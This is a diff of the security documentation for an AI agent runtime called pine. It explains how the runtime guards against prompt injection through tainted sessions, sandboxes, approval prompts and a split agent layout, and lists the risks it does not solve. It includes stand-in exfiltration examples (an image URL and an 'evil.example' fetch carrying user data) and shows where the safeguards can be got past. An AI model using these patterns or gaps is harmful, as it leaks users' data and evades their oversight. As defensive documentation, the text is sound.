-  something are refused after outside content, and a removal is always yours to confirm.
-  What it does for another agent (`agent` on the tools for sources,
-  servers, skills and schedules) is carried out by that agent's own tool under that agent's
-  rules, and taking something away from another agent asks you every time. Only the main agent can set anything up for all agents. Runs with the reduced
-  tool set (layer 2) have none of these tools, and a proposal from a conversation that has read
-  outside content says so in the dialog, because a web page asking for "this handy server" is
-  the obvious trick.
-- pine's own program files, for writing.
-- Runs started by untrusted events. They keep the `untrusted` profile and cannot ask for more.
-  They work in the sandbox and are never asked, whatever the agent's mode: neither `auto`
-  nor `manual` nor `bypass` applies to them.
-
-And by default `bypass` is suspended in a session that has read outside content: from then on
-that session behaves like `auto` until you reset it. A web page is exactly the moment someone
-else may be steering the agent, and bypass plus a hostile page is your whole account. The pause
-is never silent: the terminal UI prints a note, shows "bypass (paused)", and the agent itself
-is told and will say so when you ask why something is still refused.
-
-Two ways to have bypass regardless:
-
-- For one conversation, as a decision made with the facts in front of you: choose bypass in a
-  conversation that is already tainted and the UI asks whether you want a clean conversation
-  (recommended) or bypass in this one anyway. "Anyway" holds for that conversation until it is
-  reset or the mode changes.
-- Always: `"security": { "bypassWhenTainted": true }`. `pine check` says what that means for
-  each agent whose configured mode is `bypass`.
-
-With either, the guards on instruction files and git settings (layer 4) no longer hold for
-shell commands in that conversation: bypass has no sandbox and asks nothing. The file tools
-still refuse them.
-
-**Plan mode** is a fifth mode, for a different question: not how much the agent may do, but
-whether it does anything yet. In `plan` the gate lets through what only looks and refuses
-everything else with a fixed sentence, without asking you:
+In `plan` what only looks runs; everything else is refused, without asking you:
 
 | In plan mode | Examples |
 |---|---|
-| Runs | `read`, `grep`, `find`, `ls`; shell commands that only read (`ls`, `cat`, `git status`, `git diff`); web search and page reading; MCP tools their server declares read-only; `manual`, `state_get`, `sources`, `schedules`, `mcp_servers`, `skills`; `question` and `todo`; the conversation's own board (`board_read`, and `board_post`, `board_claim`, `board_done`, `board_answer` without a board's name); `stop_program`; looking at an app (after your yes for that app) |
-| Refused | `write`, `edit`, every other shell command (a redirect such as `> file` included, and every command in the background), `download`, `send`, `publish_event`, `state_set`, a post on a board with a name (`board_post` and `board_claim` with `board`), removing anything from a board (`board_remove`), `delegate`, `subagent`, `request_access`, every tool that changes the setup (`add_...`, `remove_...`, `subscribe`), MCP tools that are not declared read-only (opening a page in the browser, the tools of a `commands` server), acting in an app |
+| Runs | `read`, `grep`, `find`, `ls`; shell commands that only read (`ls`, `cat`, `git status`, `git diff`); web search and page reading; MCP tools their server declares read-only; `manual`, `state_get`, `sources`, `schedules`, `mcp_servers`, `skills`; `question` and `todo`; the conversation's own board (`board_read`, and `board_post`, `board_claim`, `board_done`, `board_answer` without a board's name); `stop_program`; looking at an app (after your yes for it) |
+| Refused | `write`, `edit`, every other shell command (a redirect such as `> file` included, and every command in the background), `download`, `send`, `publish_event`, `state_set`, the board tools with a board's name, `board_remove`, `delegate`, `subagent`, `request_access`, every tool that changes the setup (`add_...`, `remove_...`, `subscribe`), MCP tools not declared read-only (opening a page in the browser, a `commands` server's tools), acting in an app |
 
-The agent is told so in the note in front of your message, answers with a plan, and is told
-when you switch the mode off. A run started from outside is held to it too. What is on your
-`approve` list still asks. Plan mode is a way of working, not a wall: which shell command only
-looks is decided by its name, an MCP tool by its server's own word, and the sandbox is that
-of the mode the agent had when planning was switched on (none after `auto`, the sandbox
-after `safe`). A command that only reads can read whatever that mode lets it read. What holds
-an agent that is not to be trusted is the sandbox of `safe` mode, not planning.
+The agent answers with a plan and is told when you switch the mode off. A run started from outside
+is held to it too. Plan mode is a way of working, not a wall: a shell command counts as looking by
+its name, an MCP tool by its server's word, and the sandbox is that of the mode before planning.
 
-Set the mode where it should last, or switch it while running:
+### Downloads
 
-```json
-{ "mode": "manual" }
-```
+The `download` tool fetches a file into the workspace, byte for byte, with its size and SHA-256,
+also where the shell has no network. The file is put in place through the agent's sandbox.
+`limits.maxDownloadMb` (200) caps the size. A run started from outside has no such tool.
 
-in `agent.json` (or `defaults.mode` in `pine.json` for all agents); `/mode` or `shift+tab` in the
-terminal UI; `pine mode <agent> <mode>` from a shell. A switch to `auto`, `safe` or `manual` is saved
-in the agent's `agent.json` and holds after a restart. A switch to `bypass` or `plan` lasts until
-the daemon restarts.
+- An address on the origin of one of the agent's remote MCP servers (same scheme, host and port)
+  is fetched without a question; a redirect elsewhere is not followed under this rule.
+- A server's `headers` (its key) go only with an address one of that server's tools returned in
+  the same conversation, exactly as returned: never to an address the agent made up, never along
+  a redirect, never for a server marked `taints`. The key stays out of the conversation.
+- With the bundled `web` or `browser` server, any public https address is fetched without a
+  question, also after outside content. The `web` server's `allowHosts` and `denyHosts` apply
+  while the conversation has no network of its own, and its `allowPrivate` too.
+- Otherwise an address needs network access for the conversation (`sandbox.network`, a grant, or
+  `auto`/`bypass`); without it the download is refused, unasked. With it, only public https
+  addresses.
+- A file from an address that is not one of your servers, or from a server marked `taints`,
+  marks the session as having read outside content.
 
-### 5. Sources that go and look
+### Pictures and links in an answer
 
-- **A web address (`http`)** is fetched by pine itself, so the address is yours to confirm: the
-  dialog names it and says when it is on your own network, a redirect is followed only on the
-  same host, and a token is sent nowhere else. An address that was confirmed as a public one is
-  not followed into your network if its name later leads there. What the address answers is
-  outside content like any page an agent reads.
-- **A command (`command`)** runs in a sandbox, whatever the mode of the agent the source
-  belongs to (the main agent, for a source of all agents): that agent's own folders, no
-  network, not your environment, and instruction files read-only. It cannot read
-  pine's secrets or write its configuration. You see the command line before it is set up, in
-  every mode. What it prints is outside content unless you say the source is yours. On a
-  machine without a working sandbox it is not run at all.
-- **Status lines** (when a source last looked, what it found) are read by agents without the
-  mark that outside content gets. A source therefore repeats a found value there only when it
-  is a number or a single word.
+- A picture at a web address is fetched only when you click it, never because an answer contains
+  it: otherwise `![](https://somewhere/?q=<your notes>)` would send data out the moment it is
+  shown. The UIs show where a link goes.
+- A workspace picture's path comes from the model, so the control API serves only image, video
+  and sound files (checked by content) that really lie in the agent's workspace or the
+  conversation's folder, also not through a link. All picture routes need the token.
+- Pictures, video and sound are decoded by `sips`, `ffmpeg` or `afconvert` without network and
+  without write access outside temp, since the bytes can come from anywhere; "Open in player"
+  hands a file to the system's player only on your click.
+- Pictures a tool returned are kept in `data/media/tool` (mode 600) as long as the event log
+  (`limits.eventRetentionDays`).
 
-### 6. A new kind of source is a program
+### Event sources
 
-A source type runs inside pine with pine's rights; no sandbox applies to it. It gets in by your
-hand (`sourceTypes` in `pine.json`, or `"use"` on a single source's entry) or through the main
-agent's `add_source_type`, and then only
+A source brings in outside content by design, and a subscription lets it start an agent turn
+without you ([sources.md](sources.md), "Trust"). What keeps that safe:
 
-- from the main agent, in a conversation with you,
-- never from a conversation that has read outside content: there the tool refuses without
-  asking you,
-- with your yes in a dialog that says it is a program, how long it is, what it imports and
-  where the file is, in every mode and every time,
-- as a copy pine takes at that moment into its own home, which agents cannot write. What you
-  confirmed is what runs.
+- Events are outside content unless the source is marked `"trust": "owner"`. By default an event
+  is delivered into the subscribed conversation, framed as data, and taints it: sending out asks
+  you, bypass is paused. `"separate": true` on the subscription starts a reduced run of its own
+  instead (layer 2): the stronger protection for sources that carry strangers' text.
+- An agent sets up a source (`add_source`) only in a conversation with you, and you confirm
+  everything that opens something new: a folder outside its workspace, a connection, a port, a
+  source for all agents, a trusted source. A secret pine makes is never shown to the model, and
+  every secret is kept in `.env`, out of events and logs.
+- `subscribe` is not in a reduced run, and asks you after outside content: a page must not make
+  an agent start listening. An unsubscribed source does not run: no port, no connection.
+- A type that listens on a port (`ftp`, `smtp`, `syslog`, `webhook`) only receives, and needs a
+  password, a secret or a list of client addresses, or the dialog and `pine check` say that
+  anyone on the network can write to it.
+- A type that connects out reaches only the address you confirmed: a public name that later
+  leads into your network is refused, a redirect to another host is not followed, a token goes
+  only to its host.
+- What people write is never taken for your words: `mail`, `smtp`, `slack`, `matrix`, `discord`
+  and `zulip` report outside content whoever a message claims to be from. Do not give them
+  `"trust": "owner"`; `pine check` names every source that has it.
+- A source that can send (`mail`, `slack`, `matrix`, `discord`, `zulip`, `mqtt`) sends only to
+  the addresses, channels or topics on its own list, checked by the type itself.
+- `read_source` (earlier messages of a Slack channel) reads only where the source listens, and
+  what it returns taints the conversation. A run from outside does not have it.
+- A `command` source runs in the sandbox of the agent it belongs to, whatever that agent's mode:
+  its folders, no network, not your environment, instruction files read-only. You see the
+  command line first. Without a sandbox it does not run; with `follow` it is refused on Linux.
+- `http` with `render` looks with pine's browser behind the browser tools' guard, with no tools,
+  cookies or token; the page's scripts run, which the dialog says. The `system` type starts a
+  helper pine built itself; no option names a program.
+- A status line is read without the outside-content mark, so it repeats a found value only when
+  it is a number or a single word.
+- A subscription has a throttle (10 s by default), so a chatty device cannot keep a model busy.
 
-Read the file before you confirm. Nothing else stands between that module and your account.
-`pine check` lists every registered source type, and every source that names a module with
-`"use"`, with the file it runs.
+Each type's own limits are in [source-types.md](source-types.md).
 
-### 7. Schedules act in your name
+### A new kind of source is a program
 
-What a schedule starts counts as your wish: the agent is woken with its usual tools, and
-nothing is marked as outside content. So a schedule must really be your wish:
+A source type runs inside pine with pine's rights; no sandbox applies. It gets in by your hand
+(`sourceTypes` in `pine.json`, or `"use"` on a source) or through the main agent's
+`add_source_type`, and then only from the main agent in a conversation with you, never from one
+that has read outside content (refused without asking), with your yes in a dialog that says it is
+a program, its size, its imports and its file, in every mode and every time, and as a copy pine
+takes into its home at that moment: what you confirmed is what runs. Read the file before you
+confirm. `pine check` lists every registered type and every source with `"use"`.
 
-- An agent schedules for the conversation it is in, or for itself from its main conversation,
-  without a question (except in manual mode). For itself from a side conversation, or for all
-  agents (the main agent only), you are asked.
-- In a conversation that has read outside content you are asked in every case, in every mode,
-  and you see the task: a sentence on a web page must not turn into something done every hour.
-- An interval an agent sets is at least a minute.
-- A schedule is an entry in pine's configuration, which agents cannot write. `pine schedules`
-  shows all of them with their tasks; an agent's `schedules` tool shows its own and those for
-  all agents.
+### What no mode opens
+
+- **pine's home** (configuration, `.env`, credentials, database, other agents' folders). Agents
+  never write there; what they may set up goes through tools that check their input, write only
+  that entry, and ask you where [setup.md](setup.md), "What you are asked", says. Only the main
+  agent sets up anything for all agents, creates and changes agents, adds model servers, and
+  changes settings and routes; such a change is shown to you first, read back and undone if it
+  does not load, and refused in a conversation that has read outside content (routes and
+  decision models are put to you there instead). A proposal from such a conversation says so in
+  the dialog: a page asking for "this handy server" is the obvious trick.
+- **pine's program files**, for writing.
+- **More for a run started from outside.** It keeps the `untrusted` profile.
+
+### Schedules act in your name
+
+What a schedule starts counts as your wish: the agent has its usual tools and nothing is marked.
+So an agent schedules without a question only for its conversation, or for itself from its main
+conversation (not in manual mode); for itself from a side conversation, or for all agents (main
+agent only), you are asked. After outside content you are asked in every case and see the task:
+a sentence on a page must not become something done every hour. A schedule is an entry in pine's
+configuration, which agents cannot write ([events.md](events.md), "Schedules").
+
+### A goal goes on in your name
+
+With `/goal` pine calls an agent again until an objective is met ([agents.md](agents.md), "Goal
+mode"). Only you set, pause, resume or clear a goal; no tool reaches it. What calls the agent
+again is your objective inside fixed text of pine's, never the agent's answer or the judge's
+reason, which could repeat a web page in your voice. The judge can only say one of three words: a
+wrong "met" or "blocked" stops the work, a wrong "continue" costs rounds (at most
+`limits.goalRounds`), and no verdict pauses. A run from outside has no goal. Every round works
+under the mode and approvals as any task, and your own message, `esc`, a failed round or a
+restart pause it.
 
 ### A swarm goes on in your name
 
 With `/swarm` an agent leads a job and is called again while tasks on the conversation's board
-are not done, and when the check of its answer found something ([boards.md](boards.md), "A swarm"). As for a goal:
-
-- Only you start a swarm, pause it, resume it or clear it, through a UI or the control API. No
-  tool reaches it: an agent cannot make itself a swarm or give itself more rounds.
-- What calls the lead again is your job in your words and fixed text of pine's with the numbers
-  of tasks. No word of the lead's answer, of a sub-agent's result or of what a check found is
-  in it: the lead reads a check's result from the board, where it carries the mark of the run
-  that wrote it.
-- The check of the lead's answer that pine posts is a task on the board that holds your job and
-  that answer. It carries the outside-content mark of the
-  lead's run, like any task the lead writes itself. pine starts the sub-agent for it itself: a
-  sub-agent of that conversation, under its mode and what you allowed it, marked as the lead's
-  run was, which cannot ask you anything.
-- No model decides that a swarm is done: the board does. It stops after `limits.swarmRounds`
-  turns of the lead, and after a restart of pine it waits for you.
-- A run started from outside has no swarm, and a swarm changes nothing about what an agent
-  may do: every turn and every sub-agent works under the conversation's mode and approvals.
-
-### A goal goes on in your name
-
-With `/goal` an agent is called again and again until an objective is met ("Goal mode" in
-[agents.md](agents.md)). Each of those calls counts as your wish, like a schedule. So what may
-start one is narrow:
-
-- Only you set a goal, pause it, resume it or clear it, through the terminal UI or the control
-  API. No tool reaches it: an agent cannot give itself a goal, more rounds or another objective.
-- What calls the agent again is your objective, word for word, inside fixed text of pine's.
-  Nothing the agent wrote and nothing the judge said is in it. The agent's answer may repeat
-  what a web page told it; put into the next round's message, that text would speak with your
-  voice. The judge's reason is shown to you instead.
-- The judge reads the agent's answer, so text from outside can reach it. All it can do with
-  that is say one of three words. A wrong "met" or "blocked" stops the work; a wrong "continue"
-  costs rounds, of which there are at most `limits.goalRounds` before you are needed again.
-  No verdict at all pauses the goal.
-- A run started from outside has no goal: it works in the `~u` twin of a conversation, where
-  none can be set, and its end is never judged or continued.
-- A goal changes nothing about what an agent may do. In every round its mode and your
-  approvals apply as in any other task; a conversation that has read outside content
-  stays marked through all rounds.
-- Nothing goes on unseen: your own message, `esc`, a failed round and a restart of pine each
-  pause the goal until you say `/goal resume`.
+are not done ([boards.md](boards.md), "A swarm"). As with a goal, only you start, pause, resume
+or clear one, and no tool reaches it. What calls the lead again is your job and fixed text with
+task counts, never a word of an answer or a check; the lead reads those from the board, where
+they carry the mark of the run that wrote them. The board decides when it is done, not a model;
+it stops after `limits.swarmRounds` turns and waits for you after a restart. A run from outside
+has no swarm, and every turn and sub-agent works under the conversation's mode and approvals.
 
 ### Commands in the background
 
-An agent can start a shell command that goes on after its turn (`background: true` on the
-shell tool; [coding.md](coding.md), "Commands in the background"). What keeps that inside the
-same limits:
-
-- Only your own conversations can. A run started from outside is refused, and so is a single
-  run that has no conversation to report to (a task another agent handed over, its
-  sub-agents).
-- pine starts the command, inside the sandbox the conversation's other commands run in at
-  that moment: the same files, the same network, the same environment. Running on gives it
-  nothing more. A conversation has at most eight at a time.
-- It is not held to the shell's time limit (`bashTimeoutSec`). It ends by itself, when the
-  agent (`stop_program`) or you (the code pane) stop it, or when its conversation is reset or
-  removed. Quitting pine does not end it.
-- When it has ended, pine tells the conversation in a message of its own. The last lines the
-  command printed stand in it as quoted output, each line marked, read through the agent's
-  sandbox. They are information: the message is not yours.
-- What is still running is found by pine itself, not reported by the agent, and only what the
-  conversation's own commands started can be stopped: never a process somebody names by its
-  number.
-- On Linux a conversation that has read outside content cannot start one at all ("On Linux"
-  under layer 3).
+A command started with `background: true` ([coding.md](coding.md), "Commands in the
+background") runs in the sandbox the conversation's other commands run in, so running on gives it
+nothing more. Only your own conversations can start one (at most eight at a time); a run from
+outside cannot, nor, on Linux, a conversation that has read outside content. pine finds what is
+running itself, stops only what the conversation's own commands started, and tells the
+conversation of the end in a message of its own with the output quoted, never as your words.
 
 ### Undo is yours
 
-`/undo` takes back your last message with the files it changed in the conversation's folder
-([coding.md](coding.md), "Taking a message back"). It is the one place where pine's own side
-writes into a folder, so it is narrow:
+`/undo` takes back your last message with the files it changed ([coding.md](coding.md), "Taking
+a message back"). Only you undo, only a message you typed, never a run outside content started.
+The folder's states are kept in `data/snapshots`, which no agent can write, and put back by git in
+a sandbox that writes only that folder, with no hook or filter and never through a link. The
+outside-content mark and what you allowed go back to what they were before the message, never
+to more. What left the machine (a message, a push) is not taken back.
 
-- Only you undo and redo, in the terminal UI or through the control API. No agent has a tool
-  for it, and only a message you typed is taken back, never a run that outside content
-  started.
-- The states of the folder are kept in pine's data folder (`data/snapshots`), which no agent
-  can write. An agent cannot change what an undo restores.
-- The files are put back by git inside a sandbox that can write that folder and pine's own
-  store of states, and nothing else. It reads neither the folder's git settings nor yours,
-  runs no hook and no filter, and does not write through a link.
-- Taking a message back puts the conversation's outside-content mark, and what you allowed
-  the conversation, back to what they were before that message. Never to more.
-- An undo restores files. What left the machine (a message sent, a push, a request to a
-  server) and what a command did outside the folder is not taken back.
+### Skills are instructions
 
-### 8. Skills are instructions
+A skill is read into an agent's prompt, so it is guarded like the instruction files. Skills lie
+in pine's home, which an agent reads and never writes; only `add_skill` writes them. After
+outside content a skill is put to you with its instructions, for every scope; one for all agents
+(main agent only), one an agent adds for itself from a side conversation, and every skill in
+manual mode are shown to you too. A link in a skill's folder is refused. Its scripts run like
+anything else the agent runs ([agents.md](agents.md), "Skills").
 
-A skill is read into an agent's prompt (its name and description) and followed when a task
-calls for it, so it is guarded like the instruction files:
+### Outputs check for themselves
 
-- Skills lie in pine's home, where an agent can read its own and write none. `add_skill`
-  writes them; an agent's shell and file tools cannot.
-- In a conversation that has read outside content `add_skill` is not written unseen: text
-  from a web page must not become a standing instruction. It is shown to you first, with its
-  instructions, for every scope.
-- A skill for all agents is the main agent's to add, and you see its description and
-  instructions before it exists. So does one an agent adds for itself from a side conversation.
-  In manual mode you see every skill before it exists.
-- Scripts that go along with a skill run like anything else the agent runs: in its sandbox, or without one in `auto` and `bypass` mode.
-- Files are copied as files. A link in the folder that is to go along is refused, so a skill
-  cannot be made to carry a file from outside the workspace.
+Whatever asks, the Telegram source sends only to your own chat and the MQTT source only to the
+topics on its `publish` list. An agent's `publish` list names the topics it may use at all, and
+no agent publishes on pine's own topics (`agent/`, `approval/`, `board/`, `pine/`, `state/`,
+`timer/`).
 
-### 9. Outputs check for themselves
+### Secrets
 
-Whatever asks, the Telegram source sends only to your own chat, and the MQTT source publishes
-only to topics on its `publish` list. In a conversation that has read outside content, the
-`send` tool asks you first for a source that acts on something (MQTT), and not for one that
-only writes to you (Telegram). An agent's `publish` list names the topics it
-may use at all. Agents cannot publish on pine's own topics (`agent/`, `approval/`, `board/`, `pine/`,
-`state/`, `timer/`).
+Secrets live in `.env`, are filled into the configuration and never put into pine's environment,
+so child processes do not inherit them. Known secret values (every `.env` value of eight
+characters or more, bot tokens, the control token) are replaced with `[redacted]` in events,
+outgoing messages and logs. A tool that needs a secret leaves it out and you type it into pine's
+own dialog, so no model sees it. A secret you write into a conversation anyway is redacted from
+then on, but the history and the model have seen it: change it if the model is not yours. See
+[configuration.md](configuration.md), "Secrets". `pine check` reports configuration files, and a
+home folder, that other users can read.
 
-### 10. Secrets
+### Limits against runaway behaviour
 
-- Secrets live in `.env`. pine fills them into the configuration and does not put them into
-  its environment, so child processes do not inherit them.
-- Known secret values (every value in `.env` of eight characters or more, bot tokens, the control token) are replaced with
-  `[redacted]` in events, outgoing messages and log lines.
-- A secret does not have to pass through a model to be set up. Agents are told never to ask for
-  one; a tool that needs one leaves it out, and you type it into pine's own dialog, from where
-  it goes to the daemon and into `.env`. One that is in `.env` already is used by its name. A
-  model that runs somewhere else never receives it either way.
-- If you write a secret into a conversation anyway and an agent stores it, it is redacted from
-  then on and removed from the stored events and tasks. That conversation's history and the
-  model have still seen it: change such a secret if the model is not yours.
-- `pine check` reports configuration files, and a home folder, that other users can read.
-
-### 11. Limits against runaway behaviour
-
-Delegation depth and loops, event hops, queue length per agent, task and shell time limits,
-prompt size for untrusted events, the rounds of a goal: all in [configuration.md](configuration.md). The webhook
-rate is fixed at 120 requests a minute per hook, and a conversation has at most eight commands
-in the background at a time. A command in the background is not held to the shell's time
-limit.
+Delegation depth and loops, event hops, queue length, task and shell time limits, prompt size for
+untrusted events and the rounds of a goal or a swarm are in [configuration.md](configuration.md).
+Webhooks take 120 requests a minute each.
 
 ## A layout that keeps the pieces apart
 
-The example home starts with one agent, `main`, the main agent, that has web search and the browser, and your
-account in your own conversations. What stands between the two is small: once a
-conversation has read the web, you are asked before it sends something out, and before a
-critical action as always ("What asks you"). Its shell is not looked at. That is the
-convenient setup, not the careful one; the table below is the careful one.
-
-The dangerous combination is one agent that has private data, reads outside content and can
-send things out. Once you have agents with private data, split those:
+The example home has one agent, `main`, with the web tools and your account: convenient, since
+after it has read the web only sending out and critical actions ask. The dangerous combination
+is one agent that has private data, reads outside content and can send things out. Once agents
+hold private data, split those:
 
 | Agent | Has | Does not have |
 |---|---|---|
 | `main` | Your conversation, your account, delegation to everyone | Web tools |
-| `scout` | Web search and page reading | Anything private: an empty workspace, no delegation (`"delegates": []`), no state |
+| `scout` | Web search and page reading, `safe` mode | Anything private: an empty workspace, no delegation (`"delegates": []`), no state |
 | Specialists (`gonzo`, `house`) | Their repository, their own MCP servers | Web tools, network |
 | `house` | Events from cameras and sensors (untrusted profile), writes `house/` state | A shell, the network |
 
-`main` asks `scout` to research. What comes back is text, and it taints `main`'s session: from
-then on `main` needs your approval to publish events or to hand any agent another task. Scout
-itself can be fooled by a page, but it has nothing to give away and cannot act. Give it
-`"delegates": []`: every agent hands work to the others by default, and a scout that can ask
-`gonzo` for a file has something to give away after all. Its own delegations would be put to
-you once it has read a page, which is a question you would have to answer for every search.
+`main` asks `scout` to research; the answer taints `main`'s conversation, so `main` then needs
+your yes to send out or hand on a task. Scout can be fooled but has nothing to give away, as
+long as it has `"delegates": []`: by default every agent can ask the others for their files.
 
 ## What is not solved
 
-- **Leaks through an approved or unguarded channel.** If you give one agent both private files
-  and web access, a page can ask it to fetch `https://evil.example/?q=<your data>`, and that
-  fetch is the tool working as intended. The layout above avoids it; the URL length limit only
-  makes it slower.
-- **An agent in `auto` or `bypass` mode.** It works with your own rights and without a
-  sandbox. pine's home and program are kept from it by reading its commands, which a script,
-  a variable or a program it starts gets past ("pine's own files without a sandbox"). After
-  outside content its shell can also write what is read as instructions or what makes git
-  run programs (a `CLAUDE.md` in a repository, a hook): the file tools refuse that, and
-  nothing looks at a shell command that does it, unless it names a hook or a repository's
-  configuration, which asks you. For an agent that reads the web, `safe` mode is the wall.
-- **Memory after outside content, in `auto` and `bypass` mode.** There an agent writes its own
-  `MEMORY.md`, `AGENTS.md`, `SOUL.md` and `TOOLS.md` also in a conversation that has read
-  outside content, unchecked: without a sandbox a shell command could write them whatever you
-  answered. What a page talks it into writing there is read in every later conversation,
-  without the outside-content mark. The main agent, in `auto` unless you say otherwise, writes
-  the files for all agents the same way (`AGENTS.md`, `TOOLS.md` and `USER.md` in pine's
-  home), and what it is talked into writing there is read by every agent. In `safe` mode you
-  are asked first, and once you have said yes, what is written is not checked either. The first paragraph
-  of an agent's own `AGENTS.md` is also what the agents that may hand it work read about it
-  (one line of at most 240 characters, read only from the plain file, never through a link),
-  so what it is talked into writing there reaches them too. Look into those
-  files now and then; rules it must never change go into `agents/<id>/AGENTS.md`, which it
-  cannot write.
-- **A model server reads what it is sent.** Whoever runs a server you add (`pine model add`,
-  `add_model_server`) sees every conversation of the agents that use its models: your messages,
-  the files they read, the results of their tools. Over plain `http` so does anyone on the
-  network path; use it on this machine, on your own network or through a VPN, and `https`
-  elsewhere. pine asks you before it adds one and never sends a key anywhere but to the address
-  you confirmed.
-- **Worktrees without a sandbox.** In `auto` and `bypass` mode a worktree keeps conversations
-  apart only by where their tools start; a command can write into the folder or another
-  worktree. In the sandbox, a worktree's run can still damage the repository's shared objects
-  and move other `pine/` branches (see "Worktrees" above).
-- **Bad answers.** An injected page can still make an agent tell you something false. Approval
-  prompts show you the action, not whether the reasoning behind it was honest.
-- **Approval fatigue.** If you approve without reading, layer 4 is worth nothing. Requests show
-  the full arguments for that reason.
-- **Bypass mode.** It is what it says: an agent in bypass acts with your rights, on your files,
-  with the network, unasked. Use it for a task you are watching, on an agent that is not reading
-  the web, and switch back.
-- **Your own MCP servers, extensions and source types.** They run unsandboxed (a local MCP
-  server only when you added it yourself and did not mark it `"sandboxed"`), also a source
-  type the main agent wrote and you confirmed: the dialog shows what it is, not what it does. A server that can delete mail can
-  delete mail when an agent asks; mark such servers `"approve": "tainted"` or `"always"`.
-- **Shell with network.** `sandbox.network: true` lets commands reach the internet and your
-  local network, including an unauthenticated model server and anything else that listens on
-  a port of this machine. On Linux also programs that listen on a socket file in the temp
-  folders (a tmux server, an editor's helper, an ssh agent): some of those run commands for
-  whoever connects. macOS keeps socket files closed ("On Linux" under layer 3). Prefer the `web` server or a
-  `commands` tool for the one thing that needs the network.
-- **App control is outside the sandbox.** An agent that operates your apps (the bundled
-  `computer` server) acts through them, not through its shell: what an app can open, it can
-  open. A terminal app or the Finder reaches pine's home; a mail app sends as you. What stands
-  in between is your yes for each app in a conversation, and that pine does not act in the app
-  it runs in itself, where its questions are answered. Say yes to an app that can run commands
-  or send messages only for a task you watch.
-- **A signed-in browser.** With a persistent `profile`, the bundled browser acts as you on every
-  site you signed in to. A hostile page can ask the agent to click things there. Keep signed-in
-  profiles for tasks you start and watch yourself. The same goes, without a `profile`, for
-  what you log in to in a window the agent opened for you (`browser_show`), or in the Browser
-  view of the Pine app: the agent is
-  logged in there too, for as long as that conversation's browser runs ([mcp.md](mcp.md)).
-- **The sandbox is the operating system's.** On macOS, `sandbox-exec` is deprecated but is
-  what Apple's own tools and other agent runtimes use. On Linux, bubblewrap is what Flatpak
-  uses; pine adds one narrow system call filter to it (no sockets to other programs while a
-  command has no network) and no general one. On both, a kernel or sandbox bug would be a
-  way out. For stronger isolation run the daemon under a separate user with no access to your
-  files.
-- **Linux: new instruction files exist until the command ends**, and are looked for six
-  folders deep and in at most 20000 folders. Past that, a shell command can leave one
-  behind; the file tools refuse to write instead. See "On Linux" under layer 3.
-- **Local users.** Another account on the machine that can read pine's home has everything.
-  Keep the home at mode 700.
-- **Model quality.** A small quantised model follows hostile text more readily than a large one.
-  The layers above are built for that, but a weaker model will trip the approval prompts more
-  often.
+- **Leaks through an allowed channel.** An agent with private files and web access can be asked
+  by a page to fetch `https://evil.example/?q=<your data>`: the tool working as meant. The layout
+  above avoids it.
+- **`auto` and `bypass` mode** work with your rights and no sandbox. pine's home is kept from the
+  agent by reading its commands, which a script or a variable gets past. After outside content
+  its shell can write instruction files and git hooks (a command that names a hook or a
+  repository's configuration asks). For an agent that reads the web, `safe` mode is the wall.
+- **Memory after outside content.** In `auto` and `bypass` an agent writes its own `MEMORY.md`,
+  `AGENTS.md`, `SOUL.md` and `TOOLS.md` unchecked, and the main agent the files every agent reads.
+  In `safe` mode you are asked first, but nothing checks what is written after a yes. The first
+  paragraph of `AGENTS.md` is also what other agents read about it. Look into those files now and
+  then; rules that must hold go into `agents/<id>/AGENTS.md`.
+- **A model server reads what it is sent.** Whoever runs a server you add sees the conversations
+  that use it; over plain `http` so does anyone on the path. Use `https` beyond your own network.
+- **Worktrees without a sandbox** are kept apart only by where their tools start.
+- **Bad answers and approval fatigue.** An injected page can make an agent tell you something
+  false, and an approval shows the action, not whether its reasoning was honest. Approving
+  without reading makes the questions worthless.
+- **Bypass mode** acts with your rights, unasked. Use it for a task you watch, on an agent that
+  does not read the web.
+- **Your own MCP servers, extensions and source types** run unsandboxed. A server that can delete
+  mail does so when an agent asks: mark it `"approve": "tainted"` or `"always"`.
+- **Shell with network.** `sandbox.network: true` reaches the internet and your local network,
+  an unauthenticated model server and anything on a port of this machine included; on Linux also
+  socket files in temp (a tmux server, an ssh agent). Prefer the `web` server or a `commands`
+  tool for the one thing that needs the network.
+- **App control is outside the sandbox.** What an app can open, the agent can: a terminal or the
+  Finder reaches pine's home, a mail app sends as you. Allow such apps only for a task you watch.
+- **A signed-in browser.** With a persistent `profile`, or after you log in in a window the agent
+  opened or in the Pine app's browser, the agent acts as you on that site ([mcp.md](mcp.md)).
+- **The sandbox is the operating system's.** A kernel or sandbox bug is a way out. For stronger
+  isolation run the daemon as a separate user with no access to your files.
+- **Linux:** a new instruction file exists until the command that made it ends, and is looked for
+  only six folders deep ("On Linux").
+- **Local users.** Another account that can read pine's home has everything: keep it at mode 700.
+- **Model quality.** A small quantised model follows hostile text more readily.
 
 ## Checklist
 
 1. `pine check` shows "No security notes", or you know why each note is there.
-2. Every webhook has a secret (`pine check` names hooks and `webhook` sources that have none), and `pine check` names no source whose reports count as yours unless it should (a paired Telegram account is not listed).
-3. `.env`, `pine.json`, `models.json` and `auth.json` are mode 600; the home is 700. `pine check` reports all of these.
-4. No agent has `"trustWorkspace": true` or `"mode": "bypass"` in its configuration, and every agent in `auto` mode is one you want to work with your whole account.
-5. Web and browser tools are on an agent whose workspace holds nothing private and whose mode
-   is `safe`; or you accept, for an agent in `auto` mode, that nothing looks at its shell
-   after it has read the web.
-6. MCP servers that return other people's text have `"taints": true`; those that change things
-   have `"approve": "tainted"`.
+2. Every webhook has a secret (`pine check` names hooks and `webhook` sources without one), and `pine check` names no source whose reports count as yours unless it should (a paired Telegram account is not listed).
+3. `.env`, `pine.json`, `models.json` and `auth.json` are mode 600; the home is 700. `pine check` reports these.
+4. No agent has `"trustWorkspace": true` or `"mode": "bypass"`, and every agent in `auto` mode is one you want to work with your whole account.
+5. Web and browser tools are on an agent whose workspace holds nothing private and whose mode is `safe`; or you accept, for an agent in `auto`, that nothing looks at its shell after it read the web.
+6. MCP servers that return other people's text have `"taints": true`; those that change things have `"approve": "tainted"`.
 7. No route sets `"trust": "owner"` for a source others can write to.
 8. `http.host` is `127.0.0.1`. Remote access goes through SSH or a tunnel.
-9. You receive approval requests (send yourself one: give an agent `"approve": ["bash:*"]` once
-   and ask it to run `ls`; not while the agent is in bypass, where nothing asks).
+9. You receive approval requests: give an agent `"approve": ["bash:*"]` once and ask it to run `ls` (not in bypass, where nothing asks).
